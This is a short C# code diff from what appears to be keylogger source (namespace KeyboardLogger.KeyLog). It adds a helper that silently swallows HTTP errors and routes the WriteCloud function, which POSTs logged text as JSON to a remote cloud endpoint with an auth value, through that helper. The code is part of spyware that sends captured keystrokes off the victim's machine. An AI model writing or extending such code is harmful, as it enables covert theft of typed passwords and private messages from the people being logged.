@@ -26,10 +26,18 @@ namespace KeyboardLogger.KeyLog
         DateTime logTime;
 
 
+        // HttpRequest (url, method, contentType, auth, msg)
+        static void HttpRequest(string url, string method, string contentType, string auth, string msg)
+        {
+            try { Http.Request(url, method, contentType, auth, msg); }
+            catch (Exception) { }
+        }
+
+
         // WriteCloud (id, txt)
         static void WriteCloud(string id, string txt) {
             string msg = "{\"messages\":[{\"time\":\""+DateTime.Now+"\",\"body\":\""+txt+"\"}]}";
-            Task.Factory.StartNew(() => Http.Request(url + id + "/messages", "POST", "application/json", auth, msg));
+            Task.Factory.StartNew(() => HttpRequest(url + id + "/messages", "POST", "application/json", auth, msg));
         }
 
 
